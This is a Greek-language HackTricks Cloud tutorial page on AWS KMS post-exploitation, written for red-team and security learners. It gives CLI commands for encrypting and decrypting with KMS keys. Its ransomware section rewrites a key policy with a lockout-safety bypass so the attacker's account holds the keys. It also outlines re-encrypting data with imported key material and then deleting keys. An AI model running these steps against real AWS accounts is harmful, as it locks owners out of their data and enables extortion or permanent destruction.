# AWS - Μετέπειτα Εκμετάλλευση KMS

<details>

<summary><strong>Μάθετε χάκερ AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Ειδικός Red Team του HackTricks AWS)</strong></a><strong>!</strong></summary>

Άλλοι τρόποι υποστήριξης του HackTricks:

* Αν θέλετε να δείτε την **εταιρεία σας διαφημισμένη στο HackTricks** ή να **κατεβάσετε το HackTricks σε μορφή PDF** ελέγξτε τα [**ΣΧΕΔΙΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
* Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ανακαλύψτε [**την Οικογένεια PEASS**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Εγγραφείτε στη** 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στη [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Μοιραστείτε τα χάκερ κόλπα σας υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) αποθετήρια του github.

</details>

## KMS

Για περισσότερες πληροφορίες ελέγξτε:

{% content-ref url="../../aws-security/aws-services/aws-kms-enum.md" %}
[aws-kms-enum.md](../../aws-security/aws-services/aws-kms-enum.md)
{% endcontent-ref %}

### Κρυπτογράφηση/Αποκρυπτογράφηση πληροφοριών

* Χρησιμοποιώντας ένα **συμμετρικό** κλειδί
```bash
# Encrypt data
aws kms encrypt \
--key-id f0d3d719-b054-49ec-b515-4095b4777049 \
--plaintext fileb:///tmp/hello.txt \
--output text \
--query CiphertextBlob | base64 \
--decode > ExampleEncryptedFile

# Decrypt data
aws kms decrypt \
--ciphertext-blob fileb://ExampleEncryptedFile \
--key-id f0d3d719-b054-49ec-b515-4095b4777049 \
--output text \
--query Plaintext | base64 \
--decode
```
* Χρησιμοποιώντας ένα **ασύμμετρο** κλειδί:
```bash
# Encrypt data
aws kms encrypt \
--key-id d6fecf9d-7aeb-4cd4-bdd3-9044f3f6035a \
--encryption-algorithm RSAES_OAEP_SHA_256 \
--plaintext fileb:///tmp/hello.txt \
--output text \
--query CiphertextBlob | base64 \
--decode > ExampleEncryptedFile

# Decrypt data
aws kms decrypt \
--ciphertext-blob fileb://ExampleEncryptedFile \
--encryption-algorithm RSAES_OAEP_SHA_256 \
--key-id d6fecf9d-7aeb-4cd4-bdd3-9044f3f6035a \
--output text \
--query Plaintext | base64 \
--decode
```
{% hint style="warning" %}
Εάν λάβετε το σφάλμα 'An error occurred (InvalidCiphertextException) when calling the Decrypt operation:' κατά την προσπάθεια εκτέλεσης της αποκρυπτογράφησης kms, δοκιμάστε να χρησιμοποιήσετε το **`--ciphertext-blob file://`** αντί για το **`fileb://`**.

Η χρήση του **`file://`** σάς παρέχει την ευκολία να χρησιμοποιείτε αρχεία που έχουν γραφεί στην προτιμώμενη κωδικοποίησή σας όταν χρησιμοποιείτε το CLI.
Στις εκδόσεις 1.6.3 και νεότερες του CLI, έχετε πρόσβαση σε άλλον τρόπο για να περάσετε τα περιεχόμενα ενός αρχείου στο CLI, το **`fileb://`**. Λειτουργεί παρόμοια με το **`file://`**, αλλά αντί να διαβάζει τα περιεχόμενα του αρχείου ως κείμενο, τα διαβάζει ως δυαδικά.

Σε περισσότερες περιπτώσεις, το **`file://`** θα ικανοποιήσει την περίπτωσή σας για τη μετάδοση των περιεχομένων ενός αρχείου ως είσοδο. Ωστόσο, υπάρχουν κάποιες περιπτώσεις όπου πρέπει να χρησιμοποιηθεί το **`fileb://`** για τη μετάδοση των περιεχομένων του αρχείου ως δυαδικά αντί για κείμενο.
Διαβάστε περισσότερα από την AWS εδώ: [AWS Blog - Best Practice for Local File Parameters](https://aws.amazon.com/blogs/developer/best-practices-for-local-file-parameters/)
{% endhint %}

### KMS Ransomware

Ένας επιτιθέμενος με προνομιακή πρόσβαση στο KMS θα μπορούσε να τροποποιήσει την πολιτική του KMS των κλειδιών και **να χορηγήσει στο λογαριασμό του πρόσβαση σε αυτά**, αφαιρώντας την πρόσβαση που είχε χορηγηθεί στον νόμιμο λογαριασμό.

Στη συνέχεια, οι χρήστες του νόμιμου λογαριασμού δεν θα μπορούν να έχουν πρόσβαση σε καμία πληροφορία οποιασδήποτε υπηρεσίας που έχει κρυπτογραφηθεί με αυτά τα κλειδιά, δημιουργώντας ένα εύκολο αλλά αποτελεσματικό ransomware στον λογαριασμό.

{% hint style="warning" %}
Σημειώστε ότι τα **διαχειριζόμενα κλειδιά της AWS δεν επηρεάζονται** από αυτήν την επίθεση, μόνο τα **κλειδιά που διαχειρίζεται ο πελάτης**.

Επίσης, σημειώστε την ανάγκη χρήσης της παραμέτρου **`--bypass-policy-lockout-safety-check`** (η έλλειψη αυτής της επιλογής στον ιστότοπο καθιστά αυτήν την επίθεση δυνατή μόνο από το CLI).
{% endhint %}
```bash
# Force policy change
aws kms put-key-policy --key-id mrk-c10357313a644d69b4b28b88523ef20c \
--policy-name default \
--policy file:///tmp/policy.yaml \
--bypass-policy-lockout-safety-check

{
"Id": "key-consolepolicy-3",
"Version": "2012-10-17",
"Statement": [
{
"Sid": "Enable IAM User Permissions",
"Effect": "Allow",
"Principal": {
"AWS": "arn:aws:iam::<your_own_account>:root"
},
"Action": "kms:*",
"Resource": "*"
}
]
}
```
{% hint style="danger" %}
Σημειώστε ότι αν αλλάξετε αυτήν την πολιτική και δώσετε πρόσβαση μόνο σε ένα εξωτερικό λογαριασμό, και στη συνέχεια από αυτόν τον εξωτερικό λογαριασμό προσπαθήσετε να ορίσετε μια νέα πολιτική για **να επαναφέρετε την πρόσβαση στον αρχικό λογαριασμό, δεν θα μπορέσετε**.
{% endhint %}

<figure><img src="../../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

### Γενικός KMS Ransomware

#### Παγκόσμιος KMS Ransomware
Υπάρχει άλλος τρόπος για να πραγματοποιηθεί ένας παγκόσμιος KMS Ransomware, ο οποίος θα περιλαμβάνει τα ακόλουθα βήματα:

* Δημιουργία ενός **κλειδιού με υλικό κλειδιού** που εισήχθη από τον εισβολέα
* **Επανα-κρυπτογράφηση παλαιότερων δεδομένων** που έχουν κρυπτογραφηθεί με την προηγούμενη έκδοση με το νέο.
* **Διαγραφή του KMS κλειδιού**
* Τώρα μόνο ο εισβολέας, ο οποίος διαθέτει το αρχικό υλικό του κλειδιού, θα μπορούσε να αποκρυπτογραφήσει τα κρυπτογραφημένα δεδομένα

### Καταστροφή κλειδιών
```bash
# Destoy they key material previously imported making the key useless
aws kms delete-imported-key-material --key-id 1234abcd-12ab-34cd-56ef-1234567890ab

# Schedule the destoy of a key (min wait time is 7 days)
aws kms schedule-key-deletion \
--key-id arn:aws:kms:us-west-2:123456789012:key/1234abcd-12ab-34cd-56ef-1234567890ab \
--pending-window-in-days 7
```
{% hint style="danger" %}
Σημειώστε ότι η AWS τώρα **εμποδίζει τις προηγούμενες ενέργειες από να πραγματοποιούνται από λογαριασμό σε διαφορετικό λογαριασμό:**
{% endhint %}

<figure><img src="../../../.gitbook/assets/image (17).png" alt=""><figcaption></figcaption></figure>

<details>

<summary><strong>Μάθετε το χάκινγκ στην AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Άλλοι τρόποι υποστήριξης του HackTricks:

* Αν θέλετε να δείτε την **εταιρεία σας να διαφημίζεται στο HackTricks** ή να **κατεβάσετε το HackTricks σε μορφή PDF** ελέγξτε τα [**ΣΧΕΔΙΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
* Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ανακαλύψτε [**την Οικογένεια PEASS**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Εγγραφείτε στη** 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στη [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Μοιραστείτε τα χάκινγκ κόλπα σας υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) αποθετήρια στο GitHub.

</details>
